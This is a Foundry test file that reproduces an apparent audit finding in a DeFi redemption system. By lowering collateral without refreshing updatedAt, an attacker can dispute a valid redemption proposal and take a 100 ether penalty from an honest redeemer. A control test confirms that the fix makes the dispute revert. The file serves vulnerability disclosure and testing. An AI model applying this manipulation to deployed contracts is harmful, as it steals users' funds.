// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./34177-h-07-valid-redemption-proposals-can-be-disputed-by-decreasin.sol";

contract DittoStaleUpdatedAtDisputeTest is Test {
    uint256 constant PRICE = 1 ether;

    function test_decreaseCollateralGamesTheDisputeBuffer() public {
        Exploit e = new Exploit();
        e.run();

        Vulnerable v = e.v();
        Actor redeemer = e.redeemer();
        assertEq(v.ethEscrowed(address(redeemer)), 900 ether, "redeemer paid a penalty for a valid proposal");
        assertEq(v.ethEscrowed(address(e)), 100 ether, "attacker extracted the penalty");
    }

    /// @notice Control: if decreaseCollateral correctly updated `updatedAt` (the
    /// fix), the SAME manipulation fails the dispute buffer check and the dispute
    /// reverts — the honest proposer keeps their funds.
    function test_control_freshUpdatedAt_disputeFails() public {
        Vulnerable v = new Vulnerable();
        Actor redeemer = new Actor();
        Actor otherShorter = new Actor();

        v.openShort(address(this), 1, 3000 ether, 1000 ether); // attacker, CR 3.0
        v.openShort(address(otherShorter), 1, 1800 ether, 1000 ether); // legit SR, CR 1.8
        v.fundEscrow(address(redeemer), 1000 ether);
        v.advanceTime(2 hours);

        redeemer.exec(address(v), abi.encodeCall(v.proposeRedemption, (address(otherShorter), 1, PRICE, 1000 ether)));

        // Use increaseCollateral (which DOES update updatedAt) to simulate what a
        // fixed decreaseCollateral would do: bump updatedAt to "now" as part of the
        // same collateral change. We increase then decrease to land at the same
        // final 1750 ether collateral, but with a FRESH updatedAt.
        v.increaseCollateral(1, 1 ether); // sr.updatedAt = clock (now fresh)
        v.decreaseCollateral(1, 1251 ether, PRICE); // net: 3000 + 1 - 1251 = 1750 ether, CR 1.75

        vm.expectRevert(Vulnerable.InvalidRedemptionDispute.selector);
        v.disputeRedemption(address(redeemer), address(this), 1, PRICE);
    }
}
